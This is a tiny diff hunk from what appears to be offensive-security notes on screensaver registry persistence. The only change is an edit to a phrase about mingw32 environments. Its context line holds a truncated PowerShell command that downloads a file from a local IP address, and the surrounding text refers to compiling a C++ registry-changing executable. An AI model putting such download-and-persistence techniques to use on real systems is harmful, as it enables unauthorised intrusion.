@@ -108,7 +108,7 @@ powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://192.168.14
 
 ### Code with CPP for registry changer
 
-**Below code can be use in mingw32 or *nix environment**
+**Below code can be use in mingw32 or Nix environment**
 
 We may also use C++ and compile as screensaver register key changer executable using command below:
 
